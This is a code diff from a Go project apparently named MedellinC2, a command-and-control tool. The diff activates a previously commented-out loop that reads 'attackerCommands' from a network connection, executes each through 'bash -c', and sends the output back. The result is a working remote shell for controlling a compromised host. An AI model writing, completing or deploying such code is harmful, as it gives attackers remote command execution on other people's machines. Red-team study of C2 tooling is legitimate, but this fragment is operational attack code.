@@ -5,10 +5,13 @@ Copyright © 2022 NAME HERE <EMAIL ADDRESS>
 package cmd
 
 import (
+	"bufio"
 	"errors"
 	"fmt"
+	"log"
 	"net"
 	"os"
+	"os/exec"
 
 	"github.com/manifoldco/promptui"
 	"github.com/megatop1/MedellinC2/data"
@@ -141,16 +144,15 @@ func createNewListener() { //function to construct our listener
 	println("Connection IP and Port are: " + ipAndPortString)
 	//println("Listener successfully started")
 
-	/*
-		//Accept commands from attacker
-		for {
-			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
-			cmd := exec.Command("cmd", "/c", attackerCommands)
-			if err != nil {
-				log.Fatalln(err)
-			}
-			out, _ := cmd.CombinedOutput()
+	//Accept commands from attacker
+	for {
+		attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
+		cmd := exec.Command("bash", "-c", attackerCommands)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		out, _ := cmd.CombinedOutput()
 
-			connection.Write(out)
-		} */
+		connection.Write(out)
+	}
 }
